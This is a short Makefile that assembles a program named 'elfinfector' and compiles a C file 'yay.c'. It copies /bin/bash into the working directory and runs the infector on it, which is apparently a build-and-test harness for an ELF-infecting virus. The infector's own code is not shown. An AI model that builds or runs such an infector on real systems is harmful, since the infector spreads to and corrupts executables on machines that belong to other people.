
all:
	gcc -masm=intel -m64 -o yay yay.c
	nasm -f bin -o elfinfector elfinfector.s
	chmod +x elfinfector
	
	cp elfinfector ./test/
	cp /bin/bash ./
	./elfinfector
	
	echo
	./yay

